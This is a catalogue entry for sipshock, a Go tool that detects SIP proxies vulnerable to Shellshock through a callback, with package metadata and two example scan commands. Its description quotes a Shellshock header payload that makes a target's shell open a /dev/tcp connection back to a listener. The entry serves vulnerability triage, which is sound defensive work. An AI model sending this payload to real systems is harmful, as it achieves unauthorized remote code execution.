---
name: "sipshock"
categories:
  - blackarch-scanner
version: "7.6ab5591"
homepage: "https://github.com/zaf/sipshock"
packaged-by: [blackarch]
blackarch-builddate: "2021-04-27"
build-system: go
license: GPL3
meta-checked: "2026-11-09"
github-repo: "zaf/sipshock"
github-stars: 112
github-pushed: "2016-08-13"
github-archived: false
github-issues: 0
github-match: "exact"
gh-checked: "2026-11-07"
worth: 2.5
worth-basis: "full (activity+popularity+recency+adoption)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# sipshock

> Callback-based scanner that detects SIP proxies whose exec module exposes them to Shellshock (CVE-2014-6271).

## What it's for

sipshock (by zaf, Go) finds SIP proxies — Kamailio, OpenSIPS, and other
SER forks — that pass SIP headers as environment variables to a shell via
their exec module with the default `setvars=1`. That plumbing makes the
proxy remotely exploitable through Bash Shellshock: a crafted header
value becomes shell code. Rather than fingerprinting versions, sipshock
proves exploitability with a callback: it opens a local TCP listener,
sends each target a SIP INVITE carrying `X-Ploit: () { :;};exec
>/dev/tcp/<listener>` and watches which hosts connect back — a hit is a
confirmed code-execution path, not a guess. Use it to triage a VoIP
estate for this one bug; it is not a general SIP auditor.

## Typical use cases

### Scan a set of proxies for Shellshock

Point it at SIP hosts and watch for callbacks.

```
sipshock -lhost 198.51.100.10 198.51.100.20 198.51.100.30
```

Outcome: a listener opens on the local address (default port 10111),
each positional IP gets a crafted INVITE on port 5060, and any host whose
shell dials back is reported as vulnerable — a live list of
Shellshock-exploitable proxies.

### Scan non-standard ports

Match proxies on alternate SIP ports.

```
sipshock -lhost 198.51.100.10 -rport 5070 -lport 10111 198.51.100.20
```

Outcome: INVITEs go to the remote port given by `-rport` (default 5060)
while `-lport` moves the local callback listener (default 10111), so
proxies behind port translation or alternate bindings are covered.

*No corpus evidence — derived from upstream documentation (Readme.md and packaged source).*
